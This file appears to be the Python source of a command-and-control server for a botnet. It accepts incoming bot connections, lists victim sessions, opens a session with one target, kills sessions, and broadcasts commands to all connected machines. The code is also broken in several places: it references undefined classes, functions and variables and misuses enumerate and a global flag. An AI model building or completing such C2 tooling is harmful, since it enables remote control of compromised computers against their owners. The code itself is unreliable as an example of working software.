import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading
from banner import banner, Colour

start_flag = True

def c2_help_manual():
    print('''\n
    ===Command and Control (C2) Manual===

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
    \n''')

def initialise_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    return sock

def accept_connections():
    while True:
        if start_flag == False:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            bot = Bot(ip, target)
            print(Colour().green(str(ip) + ' has connected!') +
                  '\n[**] Command & Control Center: ', end="")
        except:
            pass

def print_banner_and_initial_info():
    print(banner())
    print('Run "help" command to see the usage manual')
    print(Colour().green('[+] Waiting For The Incoming Connections ...'))

def print_command_does_not_exist():
    print(Colour().red('[!!] Command Doesn\'t Exist'), end=" - ")
    print(Colour.yellow('Try running `help` command'), end="\n")

def list_targets():
    for i in enumerate(Bot.botList):
        print('Session ' + str(i.id) + ' --- ' + str(i.ip) + ' --- ' + str(i.alias))

def set_alias(command):
    session_id = int(command[5:])
    if session_id>=len(Bot.botCount):
        print('[-] No Session Under That ID Number.')
        return
    Bot.botList[session_id].alias = input('Enter new alias for session '+ str(session_id) + ':')
    print(alias)

def start_accepting_connections(sock):
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    return t1


def handle_session_command(command):
    try:
        session_id = int(command[8:])
        bot = Bot.botList[session_id]
        bot.communication(target, ip,alis)
    except Exception as e:
        print('[-] No Session Under That ID Number. Error: ', e)


def send_all(command):
    print(Colour.blue(f'Number of sessions {Bot.botCount}'))
    print(Colour.green('Target sessions!'))
    i = 0
    try:
        for i in Bot.botList:
            print(i.target)
            i.reliable_send(command)
    except Exception as e:
        print(f'Failed to send command to all targets. Error: {e}')


def clear_c2_console():
    os.system('clear')

def run_c2_server(sock, t1):
    while start_flag:
        try:
            command = input('[**] Command & Control Center: ')
            if command == 'targets':
                list_targets()
            elif command == 'clear':
                clear_c2_console()
            elif command[:7] == 'session':
                handle_session_command(command)
            elif command[:5] == 'alias':
                set_alias(command)
            elif command == 'exit':
                close_all_target_connections(targets)
                start_flag = exit_c2_server(sock, t1)
            elif command[:4] == 'kill':
                kill_target(targets, ips, command)
            elif command[:7] == 'sendall':
                send_all(command)
            elif command[:4] == 'help':
                c2_help_manual()
            elif command[:9] == 'heartbeat':
                continue
            elif command == 'heartbeat_all':
                continue
            else:
                print_command_does_not_exist()
        except (KeyboardInterrupt, SystemExit):
            handle_keyboard_interrupt()
        except ValueError as e:
            handle_value_error(e)


if __name__ == '__main__':
    sock = initialise_socket()
    t1 = start_accepting_connections(sock)
    print_banner_and_initial_info()
    run_c2_server(sock, t1)